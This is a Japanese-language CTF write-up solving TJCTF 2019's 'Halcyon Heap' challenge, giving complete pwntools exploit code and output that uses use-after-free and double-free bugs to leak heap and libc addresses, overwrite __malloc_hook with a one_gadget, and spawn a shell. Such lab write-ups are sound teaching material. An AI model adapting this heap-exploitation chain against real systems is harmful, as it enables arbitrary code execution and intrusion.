// date: 2019-07-06

# はじめに
writeupを書のは久しぶりですね。実は今月引っ越す予定なので、その準備でCTFをやる時間がなかなか取れなかったのです。さて今回は、<a target="_blank" href="https://twitter.com/megumish">@megumish</a>さんが開催しているHacker Hourで解けた、<a target="_blank" href="https://twitter.com/search?q=TJCTF">TJCTF</a>で出てたヒープ系の問題「Halcyon Heap」の解法を紹介します。

# 問題概要
問題のページから「halcyon_heap」と「libc.so.6」をダウンロードしました。
`libc-2.23.so`の様です。とりあえずhalcyon_heapのセキュリティ機構を確認しましょう。
```
$ sha256sum halcyon_heap libc.so.6
d87f3952b7283e14cb5507d52436f8ee9af762a89edf2d9d9b8a805132ec2d2a  halcyon_heap
74ca69ada4429ae5fce87f7e3addb56f1b53964599e8526244fecd164b3c4b44  libc.so.6
$ checksec halcyon_heap 
[*] '/ctf/TJCTF2019/Binary/Halcyon_Heap/tmp/halcyon_heap'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
$
```

そしてプログラムを実行したらこんな感じです：
```
$ LD_PRELOAD=./libc.so.6 ./halcyon_heap 
Welcome to Halcyon Heap!
1. Sice a deet
2. Observe a deet
3. Brutally destroy a deet
4. Exit
> 1
Enter the size of your deet: 
> 64
Enter your deet: 
> NekochanNano!
Done!
Welcome to Halcyon Heap!
1. Sice a deet
2. Observe a deet
3. Brutally destroy a deet
4. Exit
> 
```

要するにdeetを(1)確保、(2)観測、そして(3)解除することが出来ますね。確保するとき、サイズとデータを入力します。念の為、radare2で入力データに対する制限を確認しました。

```
|           0x00000b2b      8b051b152000   mov eax, dword [0x0020204c] ; MOV eax = [0x20204c] = 0x0 rdi
|           0x00000b31      83f80f         cmp eax, 0xf
|       ,=< 0x00000b34      7e16           jle 0xb4c
|       |   0x00000b36      488d3da80400.  lea rdi, str.Out_of_deets   ; 0xfe5 ; "Out of deets!"
|       |   0x00000b3d      e8f6fdffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x00000b42      bfffffffff     mov edi, 0xffffffff         ; -1 ; int status
|       |   0x00000b47      e844feffff     call sym.imp.exit           ; void exit(int status)
```
> deetを確保する度にカウンターを増加し、カウンターが`15`個以上になる「Out of deets!」でプログラム終了。deetを解除してもカウンターが減らない。

```
|           0x00000b8d      8b45e4         mov eax, dword [size]
|           0x00000b90      83f878         cmp eax, 0x78               ; 'x'
|       ,=< 0x00000b93      7616           jbe 0xbab
|       |   0x00000b95      488d3d7b0400.  lea rdi, str.Deet_too_big   ; 0x1017 ; "Deet too big!"
|       |   0x00000b9c      e897fdffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x00000ba1      bfffffffff     mov edi, 0xffffffff         ; -1 ; int status
|       |   0x00000ba6      e8e5fdffff     call sym.imp.exit           ; void exit(int status)
```
> 与えた確保サイズが`120`以上であれば「Deet too big!」でプログラム終了。それ故、fastbinしか確保できません。

radare2で性的解析を続けたら、次の脆弱性を見つけました。

(1) 観測機能にUse After Freeがある。但し、目的の`index`が15以上なら「Invalid index!」で終了。
(2) 解除機能にDouble Freeがある。また、`index`が15以上だとプログラムが終了されます。

さて、エクスプロイト作成へ続ける前に、攻撃スクリプトのベースを用意しておきましょう。

```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *
context.binary = "./halcyon_heap"
context.terminal = ["tmux", "split", "-h"]

e = ELF("./halcyon_heap")
libc = ELF("./libc.so.6")
p = e.process(env={"LD_PRELOAD" : libc.path})

counter = 0

def create_deet(size, value):
        global counter
        p.sendlineafter("> ", "1")
        p.sendlineafter("> ", str(size))
        p.sendlineafter("> ", value)
        counter += 1
        return counter - 1

def delete_deet(index):
        p.sendlineafter("> ", "3")
        p.sendlineafter("> ", str(index))

def observe_deet(index):
        p.sendlineafter("> ", "2")
        p.sendlineafter("> ", str(index))
        result = p.readuntil("Welcome to Halcyon Heap!")[:-24]
        print(hexdump(result))
        return result
```

# 攻撃作戦

PIEが有効になっているため、とりあえずLIBCのアドレスを把握する必要があります。
この前に見つけたUAF脆弱性を使えば以下の情報を把握できます：

(1) 開放済みのfast chunk(fastbin)を読み込むとHEAP領域の先頭アドレスがリークされる。
(2) 開放済みのsmall chunk(unsorted bin)を読み込むとLIBC内の`MAIN_ARENA`のアドレスがリークされる。

そうしたらsmall chunkを一回確保して開放すれば良さそう。でも、サイズの制限により`0x78`バイト以上な領域を確保できないので無理。

small chunkを確保できないけど、もし既に確保しているチャンクのサイズを書き換えれば具体的に同じでしょう？
あるチャンクのサイズを`0x80`以上にしたら、開放するときunsorted binに追加される（そして冒頭にMAIN_ARENAの位置が書き込まれます）。
チャンク改竄という技術を使えば行けそうです。頑張りましょう！٩( 'ω' )و 

チャンク改竄を行うには、先ずHEAP領域の先頭アドレスが必要です。
```python
a = create_deet(0x20, "")
b = create_deet(0x20, "")
delete_deet(a)
delete_deet(b)
# fastbins[0x20]: b -> a -> 0

HEAP_BASE = u64(observe_deet(b)[:8])
print "[*] ヒープ先頭アドレス = %s" % (hex(HEAP_BASE))
```

次、偽チャンクが返ってくるようにさせましょう。ただし、fast chunkを再び確保する際、残っている元サイズが確認されるため、
チャンク改竄を行うとき、有効なサイズにしておかないといけません。なので以下`0x31`に設定しておきます。
```python
delete_deet(a)
# fastbins[0x20]: a -> b -> a -> 0

c = create_deet(0x20, p64(HEAP_BASE + 0x10) + p64(0x31)) 
# fastbins[0x20]: b -> a -> 偽チャンク -> ???

d = create_deet(0x20, "")
e = create_deet(0x20, "")
# fastbins[0x20]: 偽チャンク -> ???
```

チャンク改竄って頭の中で想像するのが難しいので（私にとっては）、こちらはHEAPの状況。
```
| xxxxxxxxxxxxxx00 | 0x0000000000000000  0x0000000000000031 | a, c, eのヘッダー
| xxxxxxxxxxxxxx10 | 0x00005604cf3a200a  0x0000000000000031 | a, c, eのデータ
| xxxxxxxxxxxxxx20 | 0x000000000000000a  0x0000000000000000 | a, c, eのデータ --+
| xxxxxxxxxxxxxx30 | 0x0000000000000000  0x0000000000000031 | b, dのヘッダー　　 | 偽チャンクの範囲
| xxxxxxxxxxxxxx40 | 0x00005604cf3a200a  0x0000000000000000 | b, dのデータ    --+
| xxxxxxxxxxxxxx50 | 0x0000000000000000  0x0000000000000000 | b, dのデータ　
| xxxxxxxxxxxxxx60 | 0x0000000000000000  0x0000000000020fa1 | 以降、トップチャンク
```

ご覧のように、偽チャンクのデータが`d`のヘッダーとオーバーラップしています。したがって偽チャンクを書き込めば`d`チャンクのサイズを変更できます。
```python
f = create_deet(0x20, p64(0x00) * 3 + p64(0x91))
```

なう、`d`のサイズが`0x91`になっていますが、このまま開放してしまえばプログラムが破壊されます。何故なら、次のチャンク（`0x90+0x8=0x98`バイト後）の`prev_inuse`ビットが設定されていないため、`double free or corruption (!prev)`が検知されます。なので正しいサイズも入れておかないといけません。
```python
g = create_deet(0x50, "\x00" * 0x50)
h = create_deet(0x50, "\x00" * 0x48 + p64(0x01))
delete_deet(d)

MAIN_ARENA = u64(observe_deet(d)[:8])
LIBC_BASE = MAIN_ARENA - 0x3c4b78
print "[*] LIBC先頭アドレス = %s" % (hex(LIBC_BASE))
```

確認のため、今までの魔術を試してみましょう！\\(ﾟ∀ﾟﾍ)ｱﾌﾞﾗｶﾀﾞﾌﾞﾗ
```
$ ./exploit.py 
[*] '/ctf/TJCTF2019/Binary/Halcyon_Heap/halcyon_heap'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/ctf/TJCTF2019/Binary/Halcyon_Heap/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process '/ctf/TJCTF2019/Binary/Halcyon_Heap/halcyon_heap': pid 7655
00000000  00 30 f8 02  c9 55 00 00  00 00 00 00  00 00 00 00  │·0··│·U··│····│····│
00000010  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
00000020
[*] ヒープ先頭アドレス = 0x55c902f83000
00000000  78 3b 9c d8  db 7f 00 00  78 3b 9c d8  db 7f 00 00  │x;··│····│x;··│····│
00000010  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
00000020
[*] LIBC先頭アドレス = 0x7fdbd85ff000
[*] Stopped process '/ctf/TJCTF2019/Binary/Halcyon_Heap/halcyon_heap' (pid 7655)
$ 
```
わ〜ぃ！行けた！LIBCのアドレスをうまく掴めました〜！٩(๑´0`๑)۶

最後に、シェルをスポーンすることです！単に`__malloc_hook`にone-gadgetのアドレスを書き込めばいいでしょう。
但し、前と同じく、fastchunkに合ってるサイズを使わないとバツなので気をつけましょう。

```
gef➤  x/6gx 0x7f0a4cd34b10-0x10
0x7f0a4cd34b00 <__memalign_hook>:       0x00007f0a4c9f5e20      0x00007f0a4c9f5a00                                           
0x7f0a4cd34b10 <__malloc_hook>:         0x0000000000000000      0x0000000000000000                                                                             
0x7f0a4cd34b20:                         0x0000000000000000      0x0000000000000000
```

ｳﾌﾌ~　ありましたね。

```
0x7f0a4cd34afd:                         0x0a4c9f5e20000000      0x0a4c9f5a0000007f
0x7f0a4cd34b0d <__realloc_hook+5>:      0x000000000000007f      0x0000000000000000                                
0x7f0a4cd34b1d:                         0x0000000000000000      0x0000000000000000
```

というわけで `((long) &__malloc_hook) - 0x13` を指せば `malloc` を変更できるはずです。では早速、

# いただきます！

```python
i = create_deet(0x68, "")
j = create_deet(0x68, "")
delete_deet(i)
delete_deet(j)
delete_deet(i)
k = create_deet(0x68, p64(LIBC_BASE + libc.symbols["__malloc_hook"] - 0x13))
l = create_deet(0x68, "")
m = create_deet(0x68, "")
ONE_GADGET = LIBC_BASE + 0xf1147
n = create_deet(0x68, "\x00" * 0x3 + p64(ONE_GADGET))
print "[*] シェルをスポーン中 = %s" % (hex(ONE_GADGET))

p.sendlineafter(">", "1\n1\n")
p.interactive()
```

```
$ ./exploit.py 
[*] '/ctf/TJCTF2019/Binary/Halcyon_Heap/halcyon_heap'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/ctf/TJCTF2019/Binary/Halcyon_Heap/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process '/ctf/TJCTF2019/Binary/Halcyon_Heap/halcyon_heap': pid 2017
00000000  00 10 73 bd  d5 55 00 00  00 00 00 00  00 00 00 00  │··s·│·U··│····│····│
00000010  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
00000020
[*] ヒープ先頭アドレス = 0x55d5bd731000
00000000  78 0b e9 b1  b1 7f 00 00  78 0b e9 b1  b1 7f 00 00  │x···│····│x···│····│
00000010  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
00000020
[*] LIBC先頭アドレス = 0x7fb1b1acc000
[*] シェルをスポーン中 = 0x7fb1b1bbd147
[*] Switching to interactive mode
$ cat flag.txt
tjctf{d0uble_deets_0r_doubl3_free?}
$
```

お疲れ様でした ( ^^) _旦~~

以上、Halcyon Heapの解法でした。
最後まで読んで頂き、ありがとうございました！

